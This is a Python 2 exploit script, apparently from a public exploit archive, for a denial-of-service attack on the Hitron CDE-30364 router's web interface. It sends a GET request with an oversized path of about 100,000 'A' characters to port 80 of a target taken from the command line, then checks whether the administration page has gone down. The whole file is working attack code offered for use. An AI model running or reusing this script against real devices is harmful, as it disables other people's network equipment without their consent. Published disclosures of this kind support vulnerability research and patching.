#!/usr/bin/python

#-----------------------------------------------------------------------------------------
#Description:
#-----------------------------------------------------------------------------------------
#Hitron Technologies CDE-30364 is a famous ONO Router.
 
#The Hitron Technologies CDE-30364's web interface (listening on tcp/ip port 80), have a problem to insufficient bounds checking of data supplied in HTTP GET requests. The default ip adress of this adsl router, used for management purpose, is 192.168.1.1.
 
import httplib
import socket
import time
import sys
 
print "\n###########################################################################################################"
print "# Exploit Title: Router ONO Hitron CDE-30364 - Denial Of Service(80 port)                                 #"
print "# Date: 8-10-2013                                                                                         #"
print "# Exploit Author: Matias Mingorance Svensson - matias.ms[at]owasp.org                                     #"
print "# Vendor Homepage: http://www.ono.es/clientes/te-ayudamos/dudas/internet/equipos/hitron/hitron-cde-30364/ #"
print "# Tested on: Hitron Technologies CDE-30364                                                                #"
print "# Version HW: 1A                                                                                          #"
print "# Version SW: 3.1.0.8-ONO                                                                                 #"
print "###########################################################################################################\n"
 
#Send Request
print "Sending the request to router ONO Hitron CDE-30364...\n"
connct = httplib.HTTPConnection(sys.argv[1],80)
connct.request("GET", "AAAAAAAAAA"*10001)
connct.close()

#Check 80 port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
time.sleep(5)
try:
 s.connect((sys.argv[1], 80))
 s.shutdown(2)
 print "Attack Fail!\n"
except:
 print "Attack Successful! The router administration page is down!\n"